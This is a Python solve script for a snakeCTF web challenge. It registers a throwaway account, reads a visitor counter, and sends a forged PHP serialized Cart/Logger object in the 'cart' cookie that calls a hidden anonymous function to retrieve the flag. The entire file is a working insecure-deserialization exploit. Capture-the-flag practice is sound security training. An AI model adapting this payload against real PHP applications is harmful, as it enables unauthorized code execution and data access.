#!/usr/bin/env python3

import requests
import re
import sys
import random
import string
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)

CHALL_URL = sys.argv[1]

username = ''.join(random.choice(string.ascii_letters) for _ in range(10))
password = ''.join(random.choice(string.ascii_letters) for _ in range(10))
s = requests.Session()

res = s.post(f'{CHALL_URL}/api/register.php',
             data={"username": username, "password": password}, verify=False, allow_redirects=False)
if ("message" in res.json().keys() and res.json()["message"] == "failure"):
    print("Cannot register user", file=sys.stderr)
    exit(1)

res = s.post(f'{CHALL_URL}/api/login.php',
             data={"username": username, "password": password}, verify=False, allow_redirects=False)
if ("message" in res.json().keys() and res.json()["message"] == "failure"):
    print("Cannot login", file=sys.stderr)
    exit(2)

res = s.get(f'{CHALL_URL}/mycart.php', verify=False, allow_redirects=False)
visitor = hex(
    int(re.findall(r'You are our (\d+)th visitor.', res.text)[0]))[2:]
func_name = f"\x00get_flag/app/mycart.php:14${visitor}"
print("Function name: ", func_name, file=sys.stderr)
payload = quote(
    f'O:4:"Cart":2:{{s:26:"\x00Cart\x00objects_quantity_map";a:0:{{}}s:12:"\x00Cart\x00coupon";O:6:"Logger":1:{{s:23:"\x00Logger\x00logger_function";s:{len(func_name)}:"{func_name}";}}}}')
# Fix quote
payload = payload.replace("/", "%2f")
print("Payload: ", payload, file=sys.stderr)
s.cookies.set("cart", payload)

res = s.get(f'{CHALL_URL}/mycart.php', verify=False, allow_redirects=False)
flag = re.findall(r'(snakeCTF\{[^\}]*\})', res.text)
if (len(flag) == 0):
    print("Cannot find flag", file=sys.stderr)
    exit(3)

print(flag[0], file=sys.stderr)
